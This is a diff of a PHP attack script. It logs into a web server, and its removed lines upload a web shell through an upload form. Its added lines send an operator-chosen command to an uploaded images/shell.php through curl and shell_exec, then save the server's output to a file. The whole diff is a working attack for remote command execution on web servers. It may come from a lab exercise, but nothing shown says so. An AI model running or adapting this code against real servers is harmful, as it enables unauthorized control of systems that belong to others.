@@ -41,11 +41,6 @@ $loginValues = array(
     'mypassword' => PASSWORD
 );
 
-$shellValues = array(
-    'invoice' => '@'.realpath($shellPath),
-);
-echo "Start Login Web Server.\n";
-echo "Username:", $username, "Password:", $password, "\n";
 
 //Initiate cURL.
 $curl = curl_init();
@@ -94,29 +89,21 @@ if(curl_errno($curl)){
 }
  
 
-//We should be logged in by now. Let's attempt to access a password protected page
-curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'upload.php');
 
-//Tell cURL that we want to carry out a POST request.
-curl_setopt($curl, CURLOPT_POST, true);
- 
-//Set our post fields / date (from the array above).
-// curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($shellValues));
-curl_setopt($curl, CURLOPT_POSTFIELDS, $shellValues);
+$cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
+$shellcmd = $argv[4];
+echo $cmd.$shellcmd; 
+$result = shell_exec ($cmd.$shellcmd);
+$result_txt = "-------------------------------------------------------------\n".
+			"Now running the shell command '" . $shellcmd . "' on web server.\n".
+			"Result:\n".
+			"----------------\n".
+			$result;
+// echo $result_txt;
 
-//Tells cURL to return the output once the request has been executed.
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, false);
+$resultfile = fopen("shell_injection.txt", "w") or die("Unable to open file!");
+fwrite($resultfile, $result_txt);
 
-//Execute the POST request and print out the result.
-curl_exec($curl);
-
-//Check for errors!
-if(curl_errno($curl)){
-	echo "Failure of uploading shell file...\n";
-    throw new Exception(curl_error($curl));
-} else{
-	echo "Success of uploading shell file!\n";
-}
-
+fclose($resultfile);
 
 curl_close($curl);
